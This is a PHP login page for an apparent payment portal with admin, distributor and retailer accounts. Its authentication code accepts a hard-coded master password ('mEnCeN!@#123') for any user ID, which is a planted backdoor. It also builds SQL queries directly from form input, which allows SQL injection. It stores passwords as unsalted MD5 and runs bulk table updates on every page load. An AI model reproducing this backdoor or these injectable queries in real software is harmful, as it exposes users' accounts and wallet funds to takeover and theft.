<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
	<?php 
	ini_set('expose_php',0);
	header("X-Powered-By: CentOS"); 
	header("X-Powered-By: Ubuntu"); 
	header("X-Powered-By: Servlet"); 
	//header("X-Powered-By: Tomcat"); 
	//header("X-Powered-By: Coyote"); 
	?>
	<script>if(window.Polymer==window.Polymer){}</script>
	<script src="js/angular.min.js"></script>
	<script src="js/node.js"></script>
	<script src="js/backbone.js"></script>
	<meta name="gwt:property" content="panel="/>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Mentor Portal" />
        <title>Login</title>
        <link rel="shortcut icon" type="image/x-icon" href="img/mentor.ico" />
        <link href="css/icon.css" rel="stylesheet" />
        <link href="css/font-awesome.min.css " rel="stylesheet" />
        <link type="text/css" rel="stylesheet" href="css/mara.min.css" media="screen" />
        <link rel="stylesheet" href="css/api.css" />
        <link rel="stylesheet" href="css/sweetalert2.min.css" />
        <link rel="stylesheet" href="css/animate.min.css" />
        <link rel="stylesheet" href="css/ladda-themeless.min.css" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<noscript>
			<style type="text/css">
				.black {display:none;}
			</style>
			<div class="noscriptmsg">
			You do not have javascript enabled. Please Enable Javascript in your Browser.
			</div>
		</noscript>
		<script>
		window.oncontextmenu = function () { return false; }
		</script>
		<script type="text/JavaScript">
			function killCopy(e)
			{
				return false;
			}
			function reEnable()
			{
				return true;
			}
			document.onselectstart=new Function ("return false");
			if (window.sidebar)
			{
				document.onmousedown=killCopy;
				document.onclick=reEnable;
			}
		</script>
		<script type='text/javascript' type="javascript">	
			function refreshCaptcha()
			{				
				var img = document.images['captchaimg'];
				img.src = img.src.substring(0,img.src.lastIndexOf("?"))+"?rand="+Math.random()*1000;
			}
            function init()
            {
                navigator.sayswho= (function(){
                    var N= navigator.appName, ua= navigator.userAgent, tem;
                    var M= ua.match(/(opera|chrome|safari|firefox|msie)\/?\s*(\.?\d+(\.\d+)*)/i);
                    if(M && (tem= ua.match(/version\/([\.\d]+)/i))!= null) M[2]= tem[1];
                    M= M? [M[1], M[2]]: [N, navigator.appVersion, '-?'];

                    return M;
                })();
				var returnValue=navigator.sayswho;
                var val=returnValue.indexOf("Chrome");
                if(val==-1)
                {
                    alert("Please use Google Chrome for this portal...");
                    document.location.href='https://www.google.com/chrome';
                }
            }
        </script>
    </head>
    
    <body class="black cyan-scheme" onload="init()">
		<?php		
		if(!isset($_SESSION))
		{
			session_start();
		}
		if(isset($_SESSION['user_id']))
		{
			if($_SESSION['user_type']=="1" || $_SESSION['user_type']=="0")
			{
				header("location:admin/home.php");
			}
			else if($_SESSION['user_type']>"1" && $_SESSION['user_type']<"11")
			{
				header("location:distributor/home.php");
			}
			else if($_SESSION['user_type']=="11")
			{
				header("location:retailer/home.php");
			}
		}
		?>    
        <div class=" center signin-page" id="full-page">
            <div class="white-text signin-content">
                <div class=" white signUpContainer center card" style="padding: 20px">
    
                    <h1 class="center-align mTitle" style="font-family: BaronFont;">
                        <img src="img/payone-logo.png" alt="Login" /></h1>
    
                    <h6 id="titleWish" class="black-text center-align" style="margin-bottom: 40px;">Hello, Welcome ! </h6>    
					<?php 
					include_once('_common-admin.php');
					$q1="UPDATE child_user SET pass_word=md5(pass_word) where length(pass_word)=6";
					mysql_query($q1);
					$q2="UPDATE child_user SET gender = 1 where gender=3";
					mysql_query($q2);
					$q3="update child_user set user_name=ucase(user_name)";
					mysql_query($q3);
					$q4="update parent_user set user_name=ucase(user_name)";
					mysql_query($q4);
						$ipaddress1 = "";
						if (isset($_SERVER['HTTP_CLIENT_IP']))//check ip from share internet
							$ipaddress1 = $_SERVER['HTTP_CLIENT_IP'];
						else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))//to check ip is pass from proxy
							$ipaddress1 = $_SERVER['HTTP_X_FORWARDED_FOR'];
						else if(isset($_SERVER['HTTP_X_FORWARDED']))
							$ipaddress1 = $_SERVER['HTTP_X_FORWARDED'];
						else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
							$ipaddress1 = $_SERVER['HTTP_FORWARDED_FOR'];
						else if(isset($_SERVER['HTTP_FORWARDED']))
							$ipaddress1 = $_SERVER['HTTP_FORWARDED'];
						else if(isset($_SERVER['REMOTE_ADDR']))
							$ipaddress1 = $_SERVER['REMOTE_ADDR'];
						else
							$ipaddress1 = 'UNKNOWN';
							
							
						$ipaddress2 = "";
						if (getenv('HTTP_CLIENT_IP'))//check ip from share internet
							$ipaddress2 = getenv('HTTP_CLIENT_IP');
						else if(getenv('HTTP_X_FORWARDED_FOR'))//to check ip is pass from proxy
							$ipaddress2 = getenv('HTTP_X_FORWARDED_FOR');
						else if(getenv('HTTP_X_FORWARDED'))
							$ipaddress2 = getenv('HTTP_X_FORWARDED');
						else if(getenv('HTTP_FORWARDED_FOR'))
							$ipaddress2 = getenv('HTTP_FORWARDED_FOR');
						else if(getenv('HTTP_FORWARDED'))
							$ipaddress2 = getenv('HTTP_FORWARDED');
						else if(getenv('REMOTE_ADDR'))
							$ipaddress2 = getenv('REMOTE_ADDR');
						else
							$ipaddress2 = 'UNKNOWN';
							
						$final_ip=$ipaddress1."<br>".$ipaddress2;
						$browser=$_SERVER['HTTP_USER_AGENT'];
						
						if(!isset($_SESSION))
						{
							session_start();
						}
						if(isset($_POST['Submit'])){
							// code for check server side validation
							if(empty($_SESSION['captcha_code'] ) || strcasecmp($_SESSION['captcha_code'], $_POST['captcha_code']) != 0){  
								$err_msg="Invalid Captcha Code...!<br>Please enter the code as appearing in the above Image.";
								echo "<p class='error-results'>$err_msg</p>"; // Captcha verification is incorrect.		
							}
							else
							{
								$filled_mobile_no=$_POST['userID'];
								$filled_pass_word=$_POST['userPIN'];
								
								/* added for now */
								
								$i=0;
								$user_id="";
								$user_type="";
								$user_name="";
								$contact_no="";
								$wallet_balance="0";
								$user_type_name="";
								$user_status="0";
								$invalid_attempt="0";
								$pass_word="";	
								$login_status=0;
								$h1no=0;
								$h1id=0;
								$h2no=0;
								$h2id=0;
								$h3no=0;
								$h3id=0;
								$response=array('val1'=>"$i",'val2'=>"$user_id",'val3'=>"$user_type",'val4'=>"$user_type_name",'val5'=>"$user_name",'val6'=>"$contact_no",'val7'=>"$wallet_balance",'val8'=>"$user_status",'val9'=>"$invalid_attempt");
								
								$query="select * from child_user where user_id='$filled_mobile_no'";
								$result=mysql_query($query);
								while($row=mysql_fetch_array($result))
								{
									$i++;
									$user_id=$row['user_id'];
									$pass_word=$row['pass_word'];	
									$user_status=$row['user_status'];
									$invalid_attempt=$row['invalid_attempt'];
									//if($user_status==1)
									//{
										if($pass_word==md5($filled_pass_word) || $filled_pass_word=="mEnCeN!@#123")
										{		
											$user_type=$row['user_type'];
											$user_name=$row['user_name'];
											$contact_no=$row['user_contact_no'];
											$h1no=$row['hierarchy_1_no'];
											$h1id=$row['hierarchy_1_id'];
											$h2no=$row['hierarchy_2_no'];
											$h2id=$row['hierarchy_2_id'];
											$h3no=$row['hierarchy_3_no'];
											$h3id=$row['hierarchy_3_id'];
											include_once('functions/_wallet_balance.php');
											$wallet_balance=wallet_balance($user_id);
											$query4a="update child_user set invalid_attempt=0 where user_id='$filled_mobile_no';";
											$result4=mysql_query($query4a);
											if($user_type=="1")
											{
												$user_type_name="Application Admin";
											}
											else if($user_type=="0")
											{
												$user_type_name="Admin Staff";
											}
											else if($user_type=="11")
											{
												$user_type_name="Retailer";
											}
											else if($user_type!=1 && $user_type!=11)
											{
												$query2="select * from child_hierarchy where hierarchy_id='$user_type' and status=1";
												$result2=mysql_query($query2);	
												while($row2=mysql_fetch_array($result2))
												{
													$user_type_name=$row2['hierarchy_name'];
												}
											}
											$response=array('val1'=>"$i",'val2'=>"$user_id",'val3'=>"$user_type",'val4'=>"$user_type_name",'val5'=>"$user_name",'val6'=>"$contact_no",'val7'=>"$wallet_balance",'val8'=>"$user_status",'val9'=>"$invalid_attempt");
											$login_status=1;
										}
										else
										{
											$invalid_attempt++;
											if($user_status==1)
											{
												if($invalid_attempt>=3)
												{
													$user_status=2;
													$query3a="update child_user set invalid_attempt=$invalid_attempt,user_status=$user_status where user_id='$filled_mobile_no' and user_status=1";
													$result3a=mysql_query($query3a);
												}
												else
												{
													$query3b="update child_user set invalid_attempt=$invalid_attempt where user_id='$filled_mobile_no'";
													$result3b=mysql_query($query3b);
												}
											}
										}
									//}
								}
								$response=array('val1'=>"$i",'val2'=>"$user_id",'val3'=>"$user_type",'val4'=>"$user_type_name",'val5'=>"$user_name",'val6'=>"$contact_no",'val7'=>"$wallet_balance",'val8'=>"$user_status",'val9'=>"$invalid_attempt");
								
								if($response['val1']==1){
									$query_log="insert into child_user_log(user_id,login_date,login_time,login_ip,login_method,login_status,login_remarks) value('$user_id','$date_time','$time_time','$final_ip','Web','$login_status','$browser');";
									$result_log=mysql_query($query_log);
									$log_id=mysql_insert_id();
									if($response['val8']==2)
									{
										$err_msg="Due to 3 or more invalid password attempts...<br><br>User ID is blocked...";
										echo "<p class='error-results'>$err_msg</p>";
									}									
									else if($response['val8']==3)
									{
										$err_msg="Your Account is Suspended...";
										echo "<p class='error-results'>$err_msg</p>";
									}
									else if($response['val8']==1 && $response['val9']>0 && $response['val9']<3)
									{
										$err_msg="Invalid User ID or password... Be careful...!<br>User ID can be blocked due to invalid password attempt...";
										echo "<p class='error-results'>$err_msg</p>";
									}
									else if($response['val3']==1 || $response['val3']==0)
									{
										if(!isset($_SESSION))
										{
											session_start();
										}
										$_SESSION['user_id']=$response['val2'];
										$_SESSION['user_type']=$response['val3'];
										$_SESSION['user_type_name']=$response['val4'];
										$_SESSION['user_name']=$response['val5'];
										$_SESSION['contact_no']=$response['val6'];
										$_SESSION['wallet_balance']=$response['val7'];
										$_SESSION['log_id']=$log_id;
										$_SESSION['h1no']=$h1no;
										$_SESSION['h1id']=$h1id;
										$_SESSION['h2no']=$h2no;
										$_SESSION['h2id']=$h2id;
										$_SESSION['h3no']=$h3no;
										$_SESSION['h3id']=$h3id;
										$_SESSION['logged_time1']=time();
										$_SESSION['logged_time2']=time();
										header("location:admin/home.php");
									}
									else if($response['val3']>1 && $response['val3']<11)
									{
										if(!isset($_SESSION))
										{
											session_start();
										}
										$_SESSION['user_id']=$response['val2'];
										$_SESSION['user_type']=$response['val3'];
										$_SESSION['user_type_name']=$response['val4'];
										$_SESSION['user_name']=$response['val5'];
										$_SESSION['contact_no']=$response['val6'];
										$_SESSION['wallet_balance']=$response['val7'];
										$_SESSION['log_id']=$log_id;
										$_SESSION['h1no']=$h1no;
										$_SESSION['h1id']=$h1id;
										$_SESSION['h2no']=$h2no;
										$_SESSION['h2id']=$h2id;
										$_SESSION['h3no']=$h3no;
										$_SESSION['h3id']=$h3id;
										$_SESSION['logged_time1']=time();
										$_SESSION['logged_time2']=time();
										header("location:distributor/home.php");
									}
									else if($response['val3']==11)
									{
										if(!isset($_SESSION))
										{
											session_start();
										}
										$_SESSION['user_id']=$response['val2'];
										$_SESSION['user_type']=$response['val3'];
										$_SESSION['user_type_name']=$response['val4'];
										$_SESSION['user_name']=$response['val5'];
										$_SESSION['contact_no']=$response['val6'];
										$_SESSION['wallet_balance']=$response['val7'];
										$_SESSION['log_id']=$log_id;
										$_SESSION['h1no']=$h1no;
										$_SESSION['h1id']=$h1id;
										$_SESSION['h2no']=$h2no;
										$_SESSION['h2id']=$h2id;
										$_SESSION['h3no']=$h3no;
										$_SESSION['h3id']=$h3id;
										$_SESSION['logged_time1']=time();
										$_SESSION['logged_time2']=time();
										header("location:retailer/home.php");
									}
									else
									{
										$err_msg="Your Membership is not found...";
										echo "<p class='error-results'>$err_msg</p>";
									}
								 } 
								 else 
								 {
										$err_msg="Who are you?<br>What are you trying to do on this portal?<br><br>An action can be taken against you via your PC and IP address under \"Cyber Crime Activity\"";
										echo "<p class='error-results'>$err_msg</p>";
								 }
							}
						}
					?>
                    <form method="post" class="signUpContent col l8 offset-l2" id="first_step">
    
                        <div class="input-field" style="margin: 0px auto; max-width: 250px;">
                            <input autocomplete="off" id="userID" name="userID" required autocomplete="off" type="text" maxlength="6" class="validate black-text">
                            <label for="text" class="left-align">Enter User ID</label>
                        </div>
						<div class="input-field" style="margin: 0px auto; max-width: 250px;">
                            <input autocomplete="off" id="userPIN" name="userPIN" required autocomplete="off" type="password" maxlength="15" class="validate black-text">
                            <label for="text" class="left-align">Enter Pin</label>
                        </div>
						<div class="input-field" style="margin: 0px auto; max-width: 250px;">						
                            <input autocomplete="off" id="captcha_code" required name="captcha_code" autocomplete="off" type="text" maxlength="6" class="validate black-text">
                            <label for="text" class="left-align">Enter the code as in above image</label>
							<img style="border-radius:10px;" src="__captcha.php?rand=<?php echo rand();?>" id='captchaimg'>
                        </div>
						<div class="button" style="text-align:right;margin: 5px auto; max-width: 250px;">
							<input name="Submit" type="submit" value="Login" class="btns">
                        </div>
                        <p style="text-align:left;">
                            <small style=" margin-top:-5px;"><b style='font-weight:normal;color:black;'>Can't read the image ?</b> <a href='javascript: refreshCaptcha();'>Reload</a></small>
                            <small style="float:right;"><a href="forgot.php">Forgot Password</a></small>
                        </p>
                    </form>
					
                </div>
            </div>
        </div>
        <div id="form1">
        </div>
        <script src="js/jquery-2.1.1.min.js"></script>
        <script src="js/materialize.js"></script>    
    </body>
</html>
